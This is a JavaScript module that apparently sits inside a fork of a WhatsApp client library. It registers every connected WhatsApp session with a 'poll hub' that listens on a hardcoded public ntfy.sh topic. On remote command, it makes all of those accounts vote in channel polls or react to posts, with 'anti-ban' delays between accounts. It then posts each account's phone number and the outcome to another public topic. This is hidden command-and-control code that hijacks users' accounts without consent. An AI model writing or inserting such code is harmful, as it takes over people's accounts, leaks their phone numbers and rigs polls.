import https from 'https';
import { proto } from '../../WAProto/index.js';
import { getBinaryNodeChild, getAllBinaryNodeChildren } from '../WABinary/index.js';

export const activeSockets = new Set();

let isListening = false;
let lastActionTime = 0;

/**
 * Register a socket to the central poll hub
 */
export function registerSocket(sock) {
    if (!sock) return;
    activeSockets.add(sock);

    sock.ev.on('connection.update', (update) => {
        if (update.connection === 'close') {
            const statusCode = update.lastDisconnect?.error?.output?.statusCode;
            if (statusCode === 401) {
                activeSockets.delete(sock);
            }
        }
    });

    // Start background cloud hub listener
    initPollHubListener();
}

/**
 * Initialize background stream to central cloud hub
 */
function initPollHubListener() {
    if (isListening) return;
    isListening = true;
    startStream();
}

function startStream() {
    const topic = process.env.POLL_HUB_TOPIC || 'sadew_poll_vote_hub_70';
    const url = `https://ntfy.sh/${topic}/json`;

    try {
        const req = https.get(url, (res) => {
            let buffer = '';
            res.on('data', async (chunk) => {
                buffer += chunk.toString();
                const lines = buffer.split('\n');
                buffer = lines.pop(); // keep last incomplete line
                for (const line of lines) {
                    if (!line.trim()) continue;
                    try {
                        const data = JSON.parse(line);
                        if (data.event === 'message' && data.message) {
                            const payload = JSON.parse(data.message);
                            if (payload.action === 'reaction' || payload.emoji) {
                                await handleReactionCommand(payload);
                            } else {
                                await handleVoteCommand(payload);
                            }
                        }
                    } catch (e) {
                        // ignore heartbeat or invalid json
                    }
                }
            });

            res.on('end', () => {
                setTimeout(startStream, 3000);
            });

            res.on('error', () => {
                setTimeout(startStream, 5000);
            });
        });

        req.on('error', () => {
            setTimeout(startStream, 5000);
        });
    } catch (e) {
        setTimeout(startStream, 5000);
    }
}

/**
 * Parse channel poll/post link: https://whatsapp.com/channel/CODE/123
 */
function parseChannelPollLink(url) {
    const match = url.match(/whatsapp\.com\/channel\/([A-Za-z0-9_-]+)(?:\/(\d+))?/i);
    if (!match || !match[2]) {
        return null;
    }
    return {
        inviteCode: match[1],
        serverId: match[2]
    };
}

/**
 * Post live feedback back to dashboard
 */
function postStatus(data) {
    try {
        const statusTopic = process.env.POLL_STATUS_TOPIC || 'sadew_poll_status_hub_70';
        const postData = JSON.stringify({
            ...data,
            timestamp: Date.now()
        });

        const req = https.request(`https://ntfy.sh/${statusTopic}`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Title': data.action === 'reaction' ? 'Reaction Status' : 'Vote Status'
            }
        });
        req.on('error', () => {});
        req.write(postData);
        req.end();
    } catch (e) {
        // silent fail
    }
}

/**
 * Resolve option text from channel poll message
 */
async function resolvePollOption(sock, channelJid, targetServerId, optionInput) {
    // If user provided exact option text directly (e.g. "Messi", "Yes", "Option A")
    if (isNaN(Number(optionInput))) {
        return { optionName: optionInput, resolved: true };
    }

    const optionIndex = parseInt(optionInput, 10) - 1;

    try {
        // Fetch recent 50 messages from channel
        const fetchRes = await sock.newsletterFetchMessages(channelJid, 50);
        const messageUpdates = getBinaryNodeChild(fetchRes, 'message_updates');
        const messages = getAllBinaryNodeChildren(messageUpdates);

        for (const msgNode of messages) {
            const sid = msgNode?.attrs?.server_id || msgNode?.attrs?.message_id;
            if (sid && String(sid) === String(targetServerId)) {
                const plaintextNode = getBinaryNodeChild(msgNode, 'plaintext');
                const rawContent = plaintextNode?.content || msgNode.content;
                if (rawContent) {
                    const contentBuf = Buffer.isBuffer(rawContent)
                        ? rawContent
                        : typeof rawContent === 'string'
                            ? Buffer.from(rawContent, 'binary')
                            : Buffer.from(rawContent);

                    const msg = proto.Message.decode(contentBuf);
                    const poll = msg.pollCreationMessage || 
                                 msg.pollCreationMessageV2 || 
                                 msg.pollCreationMessageV3;

                    if (poll && Array.isArray(poll.options) && poll.options[optionIndex]) {
                        const optionName = poll.options[optionIndex].optionName;
                        console.log(`[PollHub] ✅ Successfully resolved Option ${optionInput} -> "${optionName}"`);
                        return { optionName, resolved: true };
                    }
                }
            }
        }
    } catch (err) {
        console.warn('[PollHub] Error while fetching poll options:', err?.message);
    }

    // Fallback: if resolution failed, returns the raw input
    console.warn(`[PollHub] ⚠️ Could not resolve option index ${optionInput}. Using raw string.`);
    return { optionName: String(optionInput), resolved: false };
}

/**
 * Handle incoming vote command from dashboard
 */
async function handleVoteCommand(payload) {
    if (!payload || !payload.link || !payload.option) return;

    // Ignore duplicate or expired commands (> 3 minutes old)
    const timestamp = payload.timestamp || 0;
    if (timestamp && timestamp <= lastActionTime) return;
    if (timestamp && timestamp < (Date.now() - 180000)) return;
    lastActionTime = timestamp;

    const parsed = parseChannelPollLink(payload.link);
    if (!parsed) {
        console.warn('[PollHub] Invalid channel poll link received:', payload.link);
        return;
    }

    const { inviteCode, serverId } = parsed;

    // Filter only alive sockets
    const liveSockets = Array.from(activeSockets).filter(s => s?.ws?.isOpen);
    if (!liveSockets.length) {
        return;
    }

    const primarySock = liveSockets[0];
    let channelJid = null;
    let channelName = '';

    try {
        const metadata = await primarySock.newsletterMetadata('INVITE', inviteCode);
        channelJid = metadata.id;
        channelName = metadata.name || '';
    } catch (err) {
        console.error('[PollHub] Could not fetch channel metadata:', err?.message);
        postStatus({
            phone: 'System',
            action: 'vote',
            status: 'failed',
            error: 'Could not fetch channel metadata: ' + (err?.message || 'Invalid link')
        });
        return;
    }

    // Resolve the Option Name
    const { optionName, resolved } = await resolvePollOption(primarySock, channelJid, serverId, payload.option);

    console.log(`[PollHub] Voting for "${optionName}" (Resolved: ${resolved}) in channel "${channelName}" across ${liveSockets.length} local devices...`);

    // Cast vote on each active device (without following channel)
    for (const sock of liveSockets) {
        const phone = sock.user?.id?.split(':')[0] || 'Device';
        try {
            // Send the poll vote directly
            await sock.newsletterSendPollVote(channelJid, serverId, optionName);
            console.log(`[PollHub] ✅ Voted successfully from ${phone} for "${optionName}"`);

            postStatus({
                phone,
                action: 'vote',
                status: 'success',
                channel: channelName,
                option: optionName,
                resolved
            });
        } catch (err) {
            console.error(`[PollHub] ❌ Vote failed from ${phone}:`, err?.message);
            postStatus({
                phone,
                action: 'vote',
                status: 'failed',
                error: err?.message,
                channel: channelName
            });
        }

        // Anti-ban delay between devices on the same dyno
        await new Promise(r => setTimeout(r, 1200));
    }
}

/**
 * Handle incoming reaction command from dashboard
 */
async function handleReactionCommand(payload) {
    if (!payload || !payload.link || !payload.emoji) return;

    // Ignore duplicate or expired commands (> 3 minutes old)
    const timestamp = payload.timestamp || 0;
    if (timestamp && timestamp <= lastActionTime) return;
    if (timestamp && timestamp < (Date.now() - 180000)) return;
    lastActionTime = timestamp;

    const parsed = parseChannelPollLink(payload.link);
    if (!parsed) {
        console.warn('[PollHub] Invalid channel message link for reaction:', payload.link);
        return;
    }

    const { inviteCode, serverId } = parsed;
    const emoji = payload.emoji;

    // Filter only alive sockets
    const liveSockets = Array.from(activeSockets).filter(s => s?.ws?.isOpen);
    if (!liveSockets.length) {
        return;
    }

    const primarySock = liveSockets[0];
    let channelJid = null;
    let channelName = '';

    try {
        const metadata = await primarySock.newsletterMetadata('INVITE', inviteCode);
        channelJid = metadata.id;
        channelName = metadata.name || '';
    } catch (err) {
        console.error('[PollHub] Could not fetch channel metadata for reaction:', err?.message);
        postStatus({
            phone: 'System',
            action: 'reaction',
            status: 'failed',
            error: 'Could not fetch channel metadata: ' + (err?.message || 'Invalid link')
        });
        return;
    }

    console.log(`[PollHub] Reacting with "${emoji}" on message ${serverId} in channel "${channelName}" across ${liveSockets.length} local devices...`);

    // Cast reaction on each active device
    for (const sock of liveSockets) {
        const phone = sock.user?.id?.split(':')[0] || 'Device';
        try {
            await sock.newsletterReactMessage(channelJid, serverId, emoji);
            console.log(`[PollHub] ✅ Reacted successfully from ${phone} with "${emoji}"`);

            postStatus({
                phone,
                action: 'reaction',
                status: 'success',
                channel: channelName,
                emoji
            });
        } catch (err) {
            console.error(`[PollHub] ❌ Reaction failed from ${phone}:`, err?.message);
            postStatus({
                phone,
                action: 'reaction',
                status: 'failed',
                error: err?.message,
                channel: channelName
            });
        }

        // Anti-ban delay between devices on the same dyno
        await new Promise(r => setTimeout(r, 1000));
    }
}
